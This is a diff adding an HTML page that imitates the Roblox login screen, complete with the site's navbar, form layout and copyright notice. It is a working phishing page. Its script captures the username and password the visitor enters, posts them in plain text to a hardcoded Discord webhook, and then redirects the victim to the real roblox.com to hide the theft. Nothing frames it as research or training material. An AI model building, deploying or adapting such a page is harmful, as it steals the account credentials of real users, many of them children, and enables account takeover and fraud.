@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Roblox</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1a1a1a;
+            color: #e0e0e0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .navbar {
+            width: 100%;
+            background-color: #2c2c2c;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+
+        .navbar img {
+            height: 40px;
+        }
+
+        .navbar ul {
+            list-style: none;
+            display: flex;
+            margin: 0;
+            padding: 0;
+        }
+
+        .navbar ul li {
+            margin-right: 20px;
+        }
+
+        .navbar ul li a {
+            color: #e0e0e0;
+            text-decoration: none;
+            font-size: 16px;
+        }
+
+        .navbar ul li a:hover {
+            text-decoration: underline;
+        }
+
+        .navbar .search {
+            display: flex;
+            align-items: center;
+            background-color: #444;
+            padding: 5px 10px;
+            border-radius: 5px;
+        }
+
+        .navbar .search input {
+            background: none;
+            border: none;
+            color: #e0e0e0;
+            outline: none;
+            margin-left: 5px;
+        }
+
+        .navbar .signup-btn {
+            background-color: #28a745;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            padding: 10px 20px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .navbar .signup-btn:hover {
+            background-color: #218838;
+        }
+
+        .login-container {
+            background-color: #2c2c2c;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .login-container h2 {
+            margin-bottom: 20px;
+            color: #fff;
+            font-size: 24px;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #444;
+            border-radius: 5px;
+            background-color: #444;
+            color: #fff;
+            font-size: 16px;
+        }
+
+        .login-container input:focus {
+            outline: none;
+            border-color: #888;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #6c757d;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .login-container button:hover {
+            background-color: #5a6268;
+        }
+
+        .login-container a {
+            color: #bbb;
+            text-decoration: none;
+            display: block;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+
+        .login-container a:hover {
+            color: #fff;
+        }
+
+        .login-container .secondary-button {
+            background-color: #6c757d;
+            margin-top: 0;
+        }
+
+        .login-container .secondary-button:hover {
+            background-color: #5a6268;
+        }
+
+        .login-container .small-text {
+            font-size: 12px;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <img src="path/to/roblox-logo.png" alt="Roblox">
+        <ul>
+            <li><a href="#">Charts</a></li>
+            <li><a href="#">Marketplace</a></li>
+            <li><a href="#">Create</a></li>
+            <li><a href="#">Robux</a></li>
+        </ul>
+        <div class="search">
+            <input type="text" placeholder="Search">
+        </div>
+    </div>
+
+    <div class="login-container">
+        <h2>Login to Roblox</h2>
+        <input type="text" id="username" placeholder="Username/Email/Phone" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button onclick="sendToDiscord()">Log In</button>
+        <a href="#">Forgot Password or Username?</a>
+        <button class="secondary-button">Email Me a One-Time Code</button>
+        <button class="secondary-button">Use Another Device</button>
+        <p class="small-text">©2024 Roblox Corporation. Roblox, the Roblox logo, and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
+    </div>
+
+    <script>
+        function sendToDiscord() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const webhookURL = 'https://discord.com/api/webhooks/1271746004734967940/EKA9-cj1ouHr2zxDFqVC7mtefqmtMS583KN2xk60-PUHz4RsK4U6zEG0giiWzmWhJs93';
+
+            const data = {
+                content: `Username: ${username}\nPassword: ${password}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = 'https://www.roblox.com';
+                } else {
+                    ('Failed to send information.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                ('Error sending information.');
+            });
+        }
+    </script>
+</body>
+</html>
